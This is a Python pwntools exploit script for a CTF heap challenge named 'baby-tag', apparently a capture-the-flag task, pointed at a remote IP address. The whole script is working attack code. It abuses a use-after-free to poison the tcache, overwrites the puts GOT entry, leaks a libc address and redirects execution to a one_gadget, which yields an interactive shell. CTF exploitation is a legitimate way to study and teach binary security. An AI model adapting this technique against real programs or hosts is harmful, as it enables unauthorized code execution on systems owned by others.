# Exploit written by @BitFriends
from pwn import *

def create(data,noread=0):
  p.sendlineafter(">","1")
  if not noread:
      p.sendlineafter("Contents>", data)

def delete():
  p.sendlineafter(">","2")

def edit(data,norecv=0):
  p.sendlineafter(">","3")
  p.sendlineafter("Contents>", data)
  if not norecv:
      p.recvuntil("You just entered: ")
      return p.recvline().strip("\n")
  else:
      return 0

#p = process("./baby-tag")
#p = remote("localhost", 2021)
p = remote("35.228.15.118", 1337)

puts_jmp_dl = 0x401040
puts_got = 0x404020

create("1337")
delete()
edit("AAAAAAAAAAAAAAAA")
delete()
edit("AAAAAAAAAAAAAAAA")
delete()
create(p64(puts_got))
create("1337")
create("1337",1)

libc_leak = u64(edit(p64(puts_jmp_dl)).ljust(8,"\x00"))
libc_base = libc_leak - 0x875a0
one_gadget = libc_base + 0xe6c81

edit(p64(one_gadget),1)

p.interactive()